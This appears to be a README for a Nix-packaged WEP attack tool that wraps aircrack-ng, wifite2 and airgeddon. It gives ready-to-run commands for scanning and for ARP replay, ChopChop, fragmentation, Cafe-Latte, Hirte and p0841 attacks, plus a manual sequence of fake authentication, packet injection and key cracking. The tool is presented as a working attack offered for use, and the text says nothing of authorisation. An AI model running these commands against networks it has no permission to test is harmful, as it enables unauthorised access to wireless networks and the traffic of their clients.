# wWEP attacks

WEP attack testing using the [aircrack-ng](https://www.aircrack-ng.org/) suite
(aireplay-ng, airodump-ng, aircrack-ng, packetforge-ng) and
[wifite2](https://github.com/kimocoder/wifite2).

Covers all common WEP attack paths:

- ARP replay
- KoreK ChopChop
- fragmentation
- Cafe-Latte
- Hirte
- p0841 broadcast variant

## Prerequisites

- Root privileges
- A wireless adapter that supports monitor mode and packet injection
  (see `check-monitor-mode`)
- A target AP still running WEP (rare in 2026 - found on embedded/IoT devices
  and legacy industrial equipment)

## Tools exposed

| Command | Description |
|---|---|
| `nix run .` | `wep-attack` - automated WEP attack |
| `nix run .#airgeddon` | airgeddon - interactive WEP attack menu |
| `nix develop` | Dev shell with the full toolset |

## Usage

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' . -- <interface> [bssid] [output-dir]
```

| Argument | Required | Description |
|---|---|---|
| `interface` | yes | Wireless interface (must support monitor mode and injection) |
| `bssid` | depends | Target AP MAC; required for all modes except `scan` and `auto` |
| `output-dir` | no | Directory for `.ivs` captures and results (default: current dir) |

## Environment variables

| Variable | Default | Description |
|---|---|---|
| `WEP_MODE` | `auto` | Attack mode (see below) |
| `WEP_TIMEOUT` | `600` | Seconds before giving up and attempting a final crack |
| `WEP_IVS` | `10000` | IV count before triggering an aircrack-ng attempt |
| `WEP_CHANNEL` | auto | Lock to a specific channel instead of auto-detecting |

## Modes

### `scan` - detect WEP APs

```bash
WEP_MODE=scan sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1
```

Scans with `iw` and lists APs that have the Privacy bit set but no RSN/WPA
info elements (i.e., pure WEP). Shows BSSID, channel and SSID.

### `auto` - wifite2 automatic (default)

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1
sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Delegates to `wifite2` which handles monitor mode, IV capture, injection and
cracking automatically. Tries all applicable methods in sequence. Best starting
point: Use specific modes only when `auto` is insufficient.

### `replay` - ARP request replay

```bash
WEP_MODE=replay sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Captures an ARP request and replays it at high speed (`aireplay-ng -3`). Each
replay causes the AP to respond with a new encrypted ARP, yielding a new IV.
Fastest method when the AP has active clients.

### `chopchop` - KoreK ChopChop

```bash
WEP_MODE=chopchop sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Decrypts the last byte of a WEP frame by truncating it and testing all 256
possibilities (`aireplay-ng -4`). Produces a `.xor` PRGA keystream file,
then uses `packetforge-ng` to forge an ARP and switches to ARP replay.
**Interactive**: aireplay-ng prompts you to confirm the decrypted packet.

### `fragment` - fragmentation attack

```bash
WEP_MODE=fragment sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Recovers a 1500-byte PRGA keystream from a single data frame (`aireplay-ng -5`),
then forges and replays ARP packets. Works even when the AP has no active clients
as long as traffic is present. **Interactive**: prompts to confirm the frame.

### `caffe-latte` - Cafe-Latte

```bash
WEP_MODE=caffe-latte sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Targets WEP **clients** without needing AP access (`aireplay-ng -6`). Listens
for gratuitous ARP frames from clients and bit-flips them to generate IVs.
Useful in scenarios where the AP is unreachable but a client is in range.

### `hirte` - Hirte attack

```bash
WEP_MODE=hirte sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

Extension of Cafe-Latte (`aireplay-ng -7`). Works against any ARP frame from
a client, not just gratuitous ARPs, which increases reliability in sparse traffic
environments.

### `p0841` - broadcast ARP variant

```bash
WEP_MODE=p0841 sudo nix run --extra-experimental-features 'nix-command flakes' . -- wlan1 AA:BB:CC:DD:EE:FF
```

ARP replay using frame control word `0841` with a broadcast destination
(`aireplay-ng -3 -p 0841 -c FF:FF:FF:FF:FF:FF`). Bypasses APs that silently
drop unicast ARP replays but respond to broadcast frames.

## airgeddon (interactive)

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' .#airgeddon
```

airgeddon's WEP menu provides a guided workflow with manual channel selection,
fake-auth verification and individual attack steps. Use it when the automated
modes need fine-tuning.

## Dev shell

```bash
nix develop
```

Available: `aircrack-ng` (aireplay-ng, airodump-ng, packetforge-ng), `airgeddon`, `iw`.

Manual attack reference:

```bash
# Monitor mode
airmon-ng start wlan1

# Capture IVs (background)
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 \
  --output-format ivs,csv --write /tmp/wep wlan1mon &

# Fake auth
aireplay-ng -1 6000 -a AA:BB:CC:DD:EE:FF -h $(cat /sys/class/net/wlan1mon/address) wlan1mon

# ARP replay (background)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan1mon &

# Crack once IVs accumulate
aircrack-ng /tmp/wep-01.ivs
```

## Notes

- WEP is broken by design - a 128-bit key can be recovered in under a minute
  with ~40,000 IVs on modern hardware. The default `WEP_IVS=10000` is
  sufficient for short keys; use `WEP_IVS=40000` for 128-bit keys.
- `chopchop` and `fragment` are the only methods that work without a single
  active client on the network; all other modes need at least occasional traffic.
- `caffe-latte` and `hirte` require the **client** (not the AP) to be in range.
  They are useful for attacking hotspot clients that roam away from the AP.
- `auto` (wifite2) is the recommended starting point: it sequences through
  methods and adjusts automatically based on what the target responds to.
